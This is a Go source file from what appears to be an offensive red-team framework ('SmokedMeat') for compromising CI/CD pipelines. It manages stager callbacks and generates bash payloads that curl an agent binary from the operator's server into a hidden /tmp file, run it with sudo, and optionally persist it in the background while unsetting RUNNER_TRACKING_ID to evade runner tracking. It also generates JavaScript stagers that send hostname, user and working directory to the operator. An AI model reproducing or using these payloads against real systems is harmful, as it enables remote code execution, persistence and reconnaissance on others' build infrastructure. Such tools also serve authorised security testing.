// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"fmt"
	"net/url"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	CallbackModeExpress  = "express"
	CallbackModeDwell    = "dwell"
	CallbackModeResident = "resident"

	selfHostedResidentRetryWindow = time.Hour
	selfHostedResidentInterval    = 5 * time.Second

	stagerMetadataDeployToken = "deploy_token"
	stagerMetadataLOTPToken   = "lotp_token"
)

var privateStagerMetadataKeys = map[string]struct{}{
	stagerMetadataDeployToken: {},
	stagerMetadataLOTPToken:   {},
}

// RegisteredStager is a stager waiting for callback from an injected payload.
type RegisteredStager struct {
	ID              string
	ResponseType    string
	Payload         string
	CreatedAt       time.Time
	ExpiresAt       time.Time
	CalledBack      bool
	CallbackAt      time.Time
	CallbackIP      string
	SessionID       string
	Metadata        map[string]string
	PrivateMetadata map[string]string `json:"-"`
	DwellTime       time.Duration
	Persistent      bool
	MaxCallbacks    int
	DefaultMode     string
	NextMode        string
	CallbackCount   int
	LastAgentID     string
	RevokedAt       *time.Time
}

type CallbackInvocation struct {
	Mode      string
	DwellTime time.Duration
}

// StagerStoreConfig configures the stager store.
type StagerStoreConfig struct {
	MaxStagers    int           // Maximum number of stagers to keep
	DefaultTTL    time.Duration // Default TTL for stagers (0 = no expiry)
	CleanupPeriod time.Duration // How often to clean expired stagers
	DeleteHook    func(string)
}

// DefaultStagerStoreConfig returns sensible defaults.
func DefaultStagerStoreConfig() StagerStoreConfig {
	return StagerStoreConfig{
		MaxStagers:    1000,
		DefaultTTL:    15 * time.Minute,
		CleanupPeriod: 1 * time.Minute,
	}
}

// StagerStore manages registered stagers.
type StagerStore struct {
	config   StagerStoreConfig
	stagers  map[string]*RegisteredStager
	mu       sync.RWMutex
	stopChan chan struct{}
	stopOnce sync.Once
}

// NewStagerStore creates a new stager store.
func NewStagerStore(config StagerStoreConfig) *StagerStore {
	return &StagerStore{
		config:   config,
		stagers:  make(map[string]*RegisteredStager),
		stopChan: make(chan struct{}),
	}
}

// Register adds a new stager.
func (s *StagerStore) Register(stager *RegisteredStager) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if len(s.stagers) >= s.config.MaxStagers {
		return fmt.Errorf("stager store full (max %d)", s.config.MaxStagers)
	}

	if stager.CreatedAt.IsZero() {
		stager.CreatedAt = time.Now()
	}
	if stager.ExpiresAt.IsZero() && s.config.DefaultTTL > 0 && !stager.Persistent {
		stager.ExpiresAt = stager.CreatedAt.Add(s.config.DefaultTTL)
	}
	if stager.Persistent {
		if stager.DefaultMode == "" {
			stager.DefaultMode = CallbackModeExpress
		}
		stager.MaxCallbacks = 0
	} else if stager.MaxCallbacks <= 0 {
		stager.MaxCallbacks = 1
	}

	registered := cloneRegisteredStager(stager)
	publicMetadata, privateMetadata := splitStagerMetadata(registered.Metadata)
	registered.Metadata = publicMetadata
	registered.PrivateMetadata = mergeStagerMetadata(registered.PrivateMetadata, privateMetadata)

	s.stagers[stager.ID] = registered
	return nil
}

// Get retrieves a stager by ID.
func (s *StagerStore) Get(id string) *RegisteredStager {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return cloneRegisteredStager(s.stagers[id])
}

// ValidateStager checks if a stager exists and is valid.
// Returns sessionID, whether it's expired, and whether it exists.
func (s *StagerStore) ValidateStager(id string) (sessionID string, expired, exists bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	stager, ok := s.stagers[id]
	if !ok {
		return "", false, false
	}

	isExpired := !stager.ExpiresAt.IsZero() && time.Now().After(stager.ExpiresAt)
	if stager.RevokedAt != nil {
		isExpired = true
	}
	return stager.SessionID, isExpired, true
}

// MarkCalledBack marks a stager as triggered.
func (s *StagerStore) MarkCalledBack(id, remoteIP string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	stager, exists := s.stagers[id]
	if !exists {
		return false
	}

	stager.CalledBack = true
	stager.CallbackAt = time.Now()
	stager.CallbackIP = remoteIP
	return true
}

func (s *StagerStore) ObservePersistentBeacon(id, remoteIP, agentID string, when time.Time) *RegisteredStager {
	s.mu.Lock()
	defer s.mu.Unlock()

	stager, exists := s.stagers[id]
	if !exists || !stager.Persistent || stager.RevokedAt != nil {
		return nil
	}

	stager.CalledBack = true
	stager.CallbackAt = when
	if remoteIP != "" {
		stager.CallbackIP = remoteIP
	}
	if agentID != "" {
		stager.LastAgentID = agentID
	}
	return cloneRegisteredStager(stager)
}

func (s *StagerStore) ResolveCallback(id, remoteIP, agentID string) (*RegisteredStager, CallbackInvocation, bool) {
	s.mu.Lock()
	deleteHook := s.config.DeleteHook
	var deleted []string
	defer func() {
		s.mu.Unlock()
		if deleteHook == nil {
			return
		}
		for _, id := range deleted {
			deleteHook(id)
		}
	}()

	stager, exists := s.stagers[id]
	if !exists {
		return nil, CallbackInvocation{}, false
	}

	if !stager.ExpiresAt.IsZero() && time.Now().After(stager.ExpiresAt) {
		return nil, CallbackInvocation{}, false
	}
	if stager.RevokedAt != nil {
		return nil, CallbackInvocation{}, false
	}

	mode := CallbackModeExpress
	if stager.Persistent {
		switch stager.DefaultMode {
		case CallbackModeDwell:
			mode = CallbackModeDwell
		default:
			mode = CallbackModeExpress
		}
		if stager.NextMode != "" {
			mode = stager.NextMode
			stager.NextMode = ""
		}
	} else if stager.DwellTime > 0 {
		mode = CallbackModeDwell
	}

	now := time.Now()
	stager.CalledBack = true
	stager.CallbackAt = now
	stager.CallbackIP = remoteIP
	stager.CallbackCount++
	stager.LastAgentID = agentID

	snapshot := cloneRegisteredStager(stager)
	if !stager.Persistent && stager.CallbackCount >= stager.MaxCallbacks {
		delete(s.stagers, id)
		deleted = append(deleted, id)
	}

	invocation := CallbackInvocation{Mode: mode}
	if mode == CallbackModeDwell {
		invocation.DwellTime = stager.DwellTime
	}
	return snapshot, invocation, true
}

func (s *StagerStore) ListPersistent(sessionID string) []*RegisteredStager {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*RegisteredStager, 0, len(s.stagers))
	for _, stager := range s.stagers {
		if !stager.Persistent {
			continue
		}
		if stager.RevokedAt != nil {
			continue
		}
		if sessionID != "" && stager.SessionID != sessionID {
			continue
		}
		result = append(result, cloneRegisteredStager(stager))
	}
	sort.Slice(result, func(i, j int) bool {
		iTime := result[i].CreatedAt
		if !result[i].CallbackAt.IsZero() {
			iTime = result[i].CallbackAt
		}
		jTime := result[j].CreatedAt
		if !result[j].CallbackAt.IsZero() {
			jTime = result[j].CallbackAt
		}
		if iTime.Equal(jTime) {
			if result[i].CreatedAt.Equal(result[j].CreatedAt) {
				return result[i].ID < result[j].ID
			}
			return result[i].CreatedAt.After(result[j].CreatedAt)
		}
		return iTime.After(jTime)
	})
	return result
}

func (s *StagerStore) ControlPersistent(id, action string) (*RegisteredStager, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	stager, exists := s.stagers[id]
	if !exists {
		return nil, fmt.Errorf("callback not found")
	}
	if !stager.Persistent {
		return nil, fmt.Errorf("callback is not persistent")
	}

	switch action {
	case "revoke":
		now := time.Now()
		stager.RevokedAt = &now
	case "default_express":
		stager.DefaultMode = CallbackModeExpress
	case "default_dwell":
		if stager.DwellTime <= 0 {
			return nil, fmt.Errorf("callback has no dwell duration configured")
		}
		stager.DefaultMode = CallbackModeDwell
	case "arm_next_dwell":
		if stager.DwellTime <= 0 {
			return nil, fmt.Errorf("callback has no dwell duration configured")
		}
		stager.NextMode = CallbackModeDwell
	case "clear_next_override":
		stager.NextMode = ""
	default:
		return nil, fmt.Errorf("unsupported callback action %q", action)
	}

	return cloneRegisteredStager(stager), nil
}

func (s *StagerStore) UpdateMetadata(id string, metadata map[string]string) *RegisteredStager {
	publicMetadata, privateMetadata := splitStagerMetadata(metadata)
	return s.UpdateMetadataWithPrivate(id, publicMetadata, privateMetadata)
}

func (s *StagerStore) UpdateMetadataWithPrivate(id string, metadata, privateMetadata map[string]string) *RegisteredStager {
	s.mu.Lock()
	defer s.mu.Unlock()

	stager, exists := s.stagers[id]
	if !exists {
		return nil
	}

	stager.Metadata = mergeStagerMetadata(stager.Metadata, publicStagerMetadata(metadata))
	stager.PrivateMetadata = mergeStagerMetadata(stager.PrivateMetadata, privateMetadata)

	return cloneRegisteredStager(stager)
}

// Remove deletes a stager.
func (s *StagerStore) Remove(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.stagers, id)
}

// List returns all stagers (for debugging/monitoring).
func (s *StagerStore) List() []*RegisteredStager {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*RegisteredStager, 0, len(s.stagers))
	for _, stager := range s.stagers {
		result = append(result, cloneRegisteredStager(stager))
	}
	return result
}

// GetBySessionID returns the first stager matching the session ID.
func (s *StagerStore) GetBySessionID(sessionID string) *RegisteredStager {
	s.mu.RLock()
	defer s.mu.RUnlock()

	for _, stager := range s.stagers {
		if stager.SessionID == sessionID {
			return cloneRegisteredStager(stager)
		}
	}
	return nil
}

// StartCleanup starts a goroutine to clean expired stagers.
func (s *StagerStore) StartCleanup() {
	go func() {
		ticker := time.NewTicker(s.config.CleanupPeriod)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				s.cleanup()
			case <-s.stopChan:
				return
			}
		}
	}()
}

// StopCleanup stops the cleanup goroutine.
func (s *StagerStore) StopCleanup() {
	s.stopOnce.Do(func() {
		close(s.stopChan)
	})
}

// cleanup removes expired stagers.
func (s *StagerStore) cleanup() {
	s.mu.Lock()

	now := time.Now()
	var deleted []string
	for id, stager := range s.stagers {
		if stager.Persistent {
			continue
		}
		if !stager.ExpiresAt.IsZero() && now.After(stager.ExpiresAt) {
			delete(s.stagers, id)
			deleted = append(deleted, id)
		}
	}
	deleteHook := s.config.DeleteHook
	s.mu.Unlock()

	if deleteHook == nil {
		return
	}
	for _, id := range deleted {
		deleteHook(id)
	}
}

// Stats returns store statistics.
func (s *StagerStore) Stats() map[string]int {
	s.mu.RLock()
	defer s.mu.RUnlock()

	triggered := 0
	pending := 0
	for _, stager := range s.stagers {
		if stager.CalledBack {
			triggered++
		} else {
			pending++
		}
	}

	return map[string]int{
		"total":     len(s.stagers),
		"triggered": triggered,
		"pending":   pending,
	}
}

func cloneRegisteredStager(stager *RegisteredStager) *RegisteredStager {
	if stager == nil {
		return nil
	}
	cloned := *stager
	if stager.Metadata != nil {
		cloned.Metadata = make(map[string]string, len(stager.Metadata))
		for k, v := range stager.Metadata {
			cloned.Metadata[k] = v
		}
	}
	if stager.PrivateMetadata != nil {
		cloned.PrivateMetadata = make(map[string]string, len(stager.PrivateMetadata))
		for k, v := range stager.PrivateMetadata {
			cloned.PrivateMetadata[k] = v
		}
	}
	if stager.RevokedAt != nil {
		revokedAt := *stager.RevokedAt
		cloned.RevokedAt = &revokedAt
	}
	return &cloned
}

func isResidentPersistenceRegisteredStager(stager *RegisteredStager) bool {
	if stager == nil || stager.Metadata == nil {
		return false
	}
	return stager.Metadata["persistence_mode"] == "resident"
}

func splitStagerMetadata(metadata map[string]string) (public, private map[string]string) {
	if len(metadata) == 0 {
		return nil, nil
	}

	public = make(map[string]string, len(metadata))
	private = make(map[string]string)
	for k, v := range metadata {
		if _, ok := privateStagerMetadataKeys[k]; ok {
			private[k] = v
			continue
		}
		public[k] = v
	}
	if len(public) == 0 {
		public = nil
	}
	if len(private) == 0 {
		private = nil
	}
	return public, private
}

func publicStagerMetadata(metadata map[string]string) map[string]string {
	public, _ := splitStagerMetadata(metadata)
	return public
}

func cloneStagerMetadata(metadata map[string]string) map[string]string {
	if len(metadata) == 0 {
		return nil
	}
	cloned := make(map[string]string, len(metadata))
	for k, v := range metadata {
		cloned[k] = v
	}
	return cloned
}

func mergeStagerMetadata(dst, src map[string]string) map[string]string {
	if len(src) == 0 {
		return dst
	}
	if dst == nil {
		dst = make(map[string]string, len(src))
	}
	for k, v := range src {
		dst[k] = v
	}
	return dst
}

func stagerPersistRelaunch(stager *RegisteredStager, kitchenURL string) (callbackMode, relaunchFlags string) {
	if !isResidentPersistenceRegisteredStager(stager) {
		return CallbackModeExpress, "-express"
	}

	flags := []string{"-interval " + selfHostedResidentInterval.String()}
	if tryCloudflareKitchenURL(kitchenURL) {
		flags = append(flags, "-max-offline "+selfHostedResidentRetryWindow.String())
	}
	return CallbackModeResident, strings.Join(flags, " ")
}

func tryCloudflareKitchenURL(rawURL string) bool {
	parsed, err := url.Parse(strings.TrimSpace(rawURL))
	if err != nil {
		return false
	}
	return strings.HasSuffix(strings.TrimSpace(parsed.Hostname()), ".trycloudflare.com")
}

// DefaultBashPayload returns the default bash payload for a stager callback.
// This is what gets executed when the injected payload phones home.
// Runs brisket synchronously for short-lived CI/CD environments.
func DefaultBashPayload(kitchenURL, agentID, sessionID string) string {
	return fmt.Sprintf(`#!/bin/bash
KITCHEN_URL="%s"
SESSION_ID="%s"

OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)
case "$ARCH" in
  x86_64) ARCH="amd64" ;;
  aarch64) ARCH="arm64" ;;
esac

AGENT_BIN="/tmp/.brisket-$$"
curl -s -o "$AGENT_BIN" "$KITCHEN_URL/agent/brisket-${OS}-${ARCH}"
if [ $? -eq 0 ] && [ -s "$AGENT_BIN" ]; then
  chmod +x "$AGENT_BIN"
  if [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
    sudo -E "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -express
  else
    "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -express
  fi
  rm -f "$AGENT_BIN" 2>/dev/null
fi
`, kitchenURL, sessionID)
}

func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) string {
	lines := []string{
		"{",
		`KITCHEN_URL="{{KITCHEN_URL}}"`,
		`SESSION_ID="{{SESSION_ID}}"`,
		`AGENT_ID="{{AGENT_ID}}"`,
		`AGENT_TOKEN="{{AGENT_TOKEN}}"`,
		`CALLBACK_ID="{{CALLBACK_ID}}"`,
		`CALLBACK_MODE="{{CALLBACK_MODE}}"`,
		`DWELL_FLAGS="{{DWELL_FLAGS}}"`,
		`PERSIST_CALLBACK_MODE="{{PERSIST_CALLBACK_MODE}}"`,
		`PERSIST_RELAUNCH_FLAGS="{{PERSIST_RELAUNCH_FLAGS}}"`,
	}
	lines = append(lines, extraEnv...)
	lines = append(lines,
		`OS=$(uname -s | tr '[:upper:]' '[:lower:]')`,
		`ARCH=$(uname -m)`,
		`case "$ARCH" in`,
		`  x86_64) ARCH="amd64" ;;`,
		`  aarch64) ARCH="arm64" ;;`,
		`esac`,
		`AGENT_BIN="/tmp/.brisket-$$"`,
		`curl -s -H "X-Agent-Token: $AGENT_TOKEN" -o "$AGENT_BIN" "$KITCHEN_URL/agent/brisket-${OS}-${ARCH}"`,
		`if [ -s "$AGENT_BIN" ]; then`,
		`  chmod +x "$AGENT_BIN"`,
		`  if [ -n "${SMOKEDMEAT_PERSIST:-}" ] && [ "$OS" = "linux" ]; then`,
		`    PERSIST_BIN="/tmp/.brisket-persist-$RANDOM"`,
		`    cp "$AGENT_BIN" "$PERSIST_BIN"`,
		`    chmod +x "$PERSIST_BIN"`,
		`    env -u RUNNER_TRACKING_ID nohup sh -c "\"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; rm -f \"$PERSIST_BIN\"" >/dev/null 2>&1 &`,
		`  fi`,
		fmt.Sprintf(`  if [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
    sudo -E "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -agent "$AGENT_ID" -token "$AGENT_TOKEN" -callback-id "$CALLBACK_ID" -callback-mode "$CALLBACK_MODE" $DWELL_FLAGS%s
  else
    "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -agent "$AGENT_ID" -token "$AGENT_TOKEN" -callback-id "$CALLBACK_ID" -callback-mode "$CALLBACK_MODE" $DWELL_FLAGS%s
  fi`, extraArgs, extraArgs),
		`  rm -f "$AGENT_BIN"`,
		`fi`,
		`} 2>/dev/null`,
	)
	return strings.Join(lines, "\n")
}

// DefaultJSPayload returns the default JS payload for a stager callback.
func DefaultJSPayload(kitchenURL, agentID, sessionID string) string {
	return fmt.Sprintf(`// SmokedMeat JS Stager
const https = require('https');
const os = require('os');

const info = {
  agent_id: '%s',
  session_id: '%s',
  hostname: os.hostname(),
  user: os.userInfo().username,
  pwd: process.cwd(),
  os: os.platform(),
  arch: os.arch()
};

const data = JSON.stringify(info);
const url = new URL('%s/b/%s');

const options = {
  hostname: url.hostname,
  port: url.port || 443,
  path: url.pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options);
req.write(data);
req.end();
`, agentID, sessionID, kitchenURL, agentID)
}

// DefaultBashPayloadWithDwell returns a bash payload with optional dwell time.
// If dwellTime > 0, agent stays active for that duration to enable pivoting with ephemeral tokens.
func DefaultBashPayloadWithDwell(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
	return DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode, dwellTime, CallbackModeExpress, "-express")
}

func DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration, persistCallbackMode, persistRelaunchFlags string) string {
	return renderStagerPayloadTemplateWithPersistence(
		authenticatedBashPayloadTemplate(nil, ""),
		kitchenURL,
		agentID,
		sessionID,
		agentToken,
		callbackID,
		callbackMode,
		dwellTime,
		persistCallbackMode,
		persistRelaunchFlags,
	)
}

func DefaultBashPayloadForRegisteredStager(kitchenURL, agentID, sessionID, agentToken string, stager *RegisteredStager, invocation CallbackInvocation) string {
	persistCallbackMode, persistRelaunchFlags := stagerPersistRelaunch(stager, kitchenURL)
	return renderStagerPayloadTemplateWithPersistence(
		authenticatedBashPayloadTemplate(nil, ""),
		kitchenURL,
		agentID,
		sessionID,
		agentToken,
		stager.ID,
		invocation.Mode,
		invocation.DwellTime,
		persistCallbackMode,
		persistRelaunchFlags,
	)
}

// DefaultJSPayloadWithToken returns a JS payload with agent token for authenticated access.
func DefaultJSPayloadWithToken(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string) string {
	return fmt.Sprintf(`// SmokedMeat JS Stager
const https = require('https');
const os = require('os');

const info = {
  agent_id: '%s',
  session_id: '%s',
  hostname: os.hostname(),
  user: os.userInfo().username,
  pwd: process.cwd(),
  os: os.platform(),
  arch: os.arch(),
  callback_id: '%s',
  callback_mode: '%s'
};

const data = JSON.stringify(info);
const url = new URL('%s/b/%s');

const options = {
  hostname: url.hostname,
  port: url.port || 443,
  path: url.pathname,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
    'X-Agent-Token': '%s'
  }
};

const req = https.request(options);
req.write(data);
req.end();
`, agentID, sessionID, callbackID, callbackMode, kitchenURL, agentID, agentToken)
}
